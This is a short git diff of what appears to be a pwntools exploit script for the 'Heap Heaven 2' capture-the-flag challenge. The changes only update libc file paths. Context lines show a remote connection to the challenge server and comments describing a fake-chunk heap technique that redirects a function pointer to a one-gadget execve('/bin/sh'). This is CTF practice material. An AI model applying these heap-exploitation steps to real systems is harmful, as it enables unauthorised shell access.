@@ -8,7 +8,7 @@ context(arch="amd64", os="linux")
 
 if not args["REMOTE"]:
     binary = ELF("./heap_heaven_2-x86_64-2.28-4")  # https://github.com/integeruser/bowkin
-    libc = ELF("libs/x86_64/4/libc-2.28.so")
+    libc = ELF("libs/x86_64/2.28/4/libc-2.28.so")
 
     argv = [binary.path]
     envp = {"PWD": os.getcwd()}
@@ -28,7 +28,7 @@ if not args["REMOTE"]:
         io = process(argv=argv, env=envp)
 else:
     binary = ELF("./heap_heaven_2")
-    libc = ELF("libs/libc-x86_64-2.28-4.so")
+    libc = ELF("libs/x86_64/2.28/4/libc-2.28.so")
 
     io = remote("arcade.fluxfingers.net", 1809)
 
@@ -154,7 +154,7 @@ free(fake_chunk4_offset)
 # in this way, at the next call of `menu()`, the binary will use a pointer to `fake_chunk4`
 # to find the array of functions; instead of `menu()`, it will find the address of the one-gadget
 
-# $ one_gadget libs/libc-x86_64-2.28-4.so
+# $ one_gadget libs/x86_64/2.28/4/libc-2.28.so
 # . . .
 # 0xe75f0 execve("/bin/sh", rsp+0x60, environ)
 # constraints:
@@ -175,7 +175,7 @@ io.interactive()
 #     Stack:    Canary found
 #     NX:       NX enabled
 #     PIE:      PIE enabled
-# [*] '/home/vagrant/vbox/Heap-Heaven-2/libs/libc-x86_64-2.28-4.so'
+# [*] '/home/vagrant/vbox/Heap-Heaven-2/libs/x86_64/2.28/4/libc-2.28.so'
 #     Arch:     amd64-64-little
 #     RELRO:    Full RELRO
 #     Stack:    Canary found
